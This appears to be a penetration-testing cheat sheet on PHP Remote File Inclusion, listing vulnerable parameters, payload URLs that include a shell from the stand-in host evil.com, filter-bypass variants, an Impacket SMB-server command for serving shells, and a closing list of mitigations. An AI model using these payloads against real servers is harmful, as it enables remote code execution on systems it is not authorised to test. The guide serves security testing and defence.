📌 Remote File Inclusion (RFI) – Complete Exploitation Guide

Remote File Inclusion allows an attacker to include a remote file, typically via a URL, leading to arbitrary code execution on the target server.

🧠 Description & Prerequisites

Remote File Inclusion (RFI) occurs when a web application includes a remote file based on user-controlled input without proper validation. It's most common in PHP applications and requires the following insecure PHP settings to be enabled:

allow_url_include = On
allow_url_fopen = On

When these settings are `On`, an attacker can include a malicious script hosted on their own server, leading to Remote Code Execution (RCE).

🏷️ Classification

  • Type: Remote File Inclusion (Injection)
  • OWASP: A03:2021 – Injection
  • CWE: CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program
  • CVSS Score: 9.8 (Critical)

🎯 Attack Surface (Where to Test)

  • ✅ Common vulnerable parameters: `?page=`, `?file=`, `?path=`, `?cat=`, `?dir=`, `?action=`, `?download=`, `?folder=`, `?view=`, `?content=`, `?layout=`, `?lang=`, `?template=`
  • ✅ Functions like `include`, `require`, `include_once`, `require_once`

💣 Basic Remote File Inclusion

# Basic RFI payload
http://example.com/index.php?page=http://evil.com/shell.txt

# Null Byte (PHP < 5.3.4)
http://example.com/index.php?page=http://evil.com/shell.txt%00

# Double Encoding
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt

🚀 Advanced Bypass Techniques

Bypassing Blacklists

If a blacklist blocks `http://` or `https://`, try case variations like `HTTP://` or `hTTp://`.

http://example.com/index.php?page=HTTP://evil.com/shell.txt

Null Byte Attack (Bypassing .php suffix)

If the server automatically appends a `.php` extension, use a question mark (`?`) to neutralize it.

http://example.com/index.php?page=http://evil.com/shell.txt?

Exploitation through SMB Server (Bypassing `allow_url_include`)

If `allow_url_include` is `Off`, RFI can still be exploited on Windows targets using the SMB protocol.

# Set up an SMB share with Impacket
python smbserver.py -smb2support sharepath /root/Desktop/Shells

# Include the remote file via SMB
http://example.com/index.php?page=\\192.168.0.8\sharepath\shell.txt

🛡️ Mitigation

✅ Disable dangerous PHP settings: Set `allow_url_fopen = Off` and `allow_url_include = Off` in `php.ini`.
✅ Use allowlist of allowed files: Only permit specific filenames, never user-controlled paths.
✅ Sanitize user input: Remove `../`, `..\`, `%00`, and encoded variants before processing.
✅ Use `realpath()` and `basename()`: Validate and normalize file paths before inclusion.
✅ Store files outside the web root: Prevent direct access to sensitive files.
✅ Run with least privilege: Use low-privileged users for web server processes.
